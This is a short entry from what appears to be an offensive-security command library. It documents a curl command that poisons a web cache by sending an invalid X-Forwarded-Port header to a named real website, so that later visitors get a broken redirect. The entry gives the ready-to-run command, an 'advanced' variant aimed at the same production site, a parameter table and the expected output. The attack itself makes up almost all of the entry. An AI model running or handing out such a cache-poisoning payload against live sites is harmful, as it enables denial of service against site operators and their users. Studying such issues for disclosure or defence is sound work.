---
data: >-
  curl -H 'X-Forwarded-Port: 123'
  https://www.hackerone.com/index.php?dontpoisoneveryone=1
tags:
  - cache-poisoning
  - dos
type: command
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
id: ee1f7ad9-b9ac-49ad-9fe7-0c417885fb78
created_at: '2025-12-14T17:26:56.740Z'
updated_at: '2025-12-14T17:26:56.740Z'
verified: false
validated: true
submitted: true
---
# curl-poison-x-forwarded-port

## Command

```bash
curl -H 'X-Forwarded-Port: 123' https://www.hackerone.com/index.php?dontpoisoneveryone=1
```

## Description

This command sends an HTTP GET request with a custom X-Forwarded-Port header set to an invalid port (123), poisoning the web cache by storing a redirect response that causes DoS on cache hits.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-H` | Adds a custom header (X-Forwarded-Port: 123) to manipulate the cache key | Yes |
| URL | Target endpoint (https://www.hackerone.com/index.php?dontpoisoneveryone=1) | Yes |

## Examples

### Basic Usage

```bash
curl -H 'X-Forwarded-Port: 123' https://www.hackerone.com/index.php?dontpoisoneveryone=1
```

### Advanced Usage

```bash
curl -H 'X-Forwarded-Port: 999' -v https://www.hackerone.com/index.php?param=1
```

## Expected Output

HTTP response headers and body indicating a successful request (e.g., 200 OK or 302 redirect), with the response cached under the poisoned key. No errors on execution, but subsequent requests fail.

## Related

- [[commands/curl-poison-x-forwarded-host]]
- [[procedures/Poison-Cache-with-X-Forwarded-Port]]
